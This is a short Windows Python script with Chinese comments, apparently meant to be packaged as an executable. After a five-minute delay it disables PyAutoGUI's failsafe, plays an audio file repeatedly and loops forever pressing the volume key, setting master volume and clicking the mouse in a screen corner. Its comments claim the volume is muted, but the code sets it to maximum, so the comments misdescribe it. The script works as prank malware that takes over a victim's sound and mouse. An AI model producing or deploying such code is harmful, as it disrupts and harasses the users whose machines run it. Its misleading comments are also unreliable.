import os
import sys
import time
import win32api
import win32con
import threading
import pyautogui
from playsound import playsound
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

time.sleep(300) # 延迟300秒，等待计算机启动完成
pyautogui.FAILSAFE = False # 禁用PyAutoGUI的安全保护，以防止异常退出
screenWidth, screenHeight = pyautogui.size() # 获取屏幕尺寸
pyautogui.moveTo(screenWidth - 1, screenHeight - 1, duration=0) # 将鼠标移动到屏幕右下角，目的是隐藏鼠标光标

# 获取音频设备
devices = AudioUtilities.GetSpeakers()
interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
volume = interface.QueryInterface(IAudioEndpointVolume)

# 播放音频并工作的线程函数
def playWork():
    for i in range(20):
        mp3Path = os.path.join(sys._MEIPASS, "audio.mp3") if getattr(sys, 'frozen', False) else "audio.mp3"
        playsound(mp3Path)


# 创建并启动播放音频并工作的线程
t = threading.Thread(target=playWork)
t.start()

# 无限循环执行以下操作
while True:
    win32api.keybd_event(0xAF, 0, 0, 0) # 按下音量减键
    win32api.keybd_event(0xAF, 0, win32con.KEYEVENTF_KEYUP, 0) # 松开音量减键
    volume.SetMasterVolumeLevel(0.0, None) # 将音量设置为静音
    pyautogui.moveTo(0, 0) # 将鼠标移动到屏幕左上角，保证切换窗口同时鼠标不会误触其他操作
    pyautogui.FAILSAFE = False # 再次禁用PyAutoGUI的安全保护，以防止异常退出
    pyautogui.mouseDown() # 按下鼠标左键
    pyautogui.mouseUp() # 松开鼠标左键
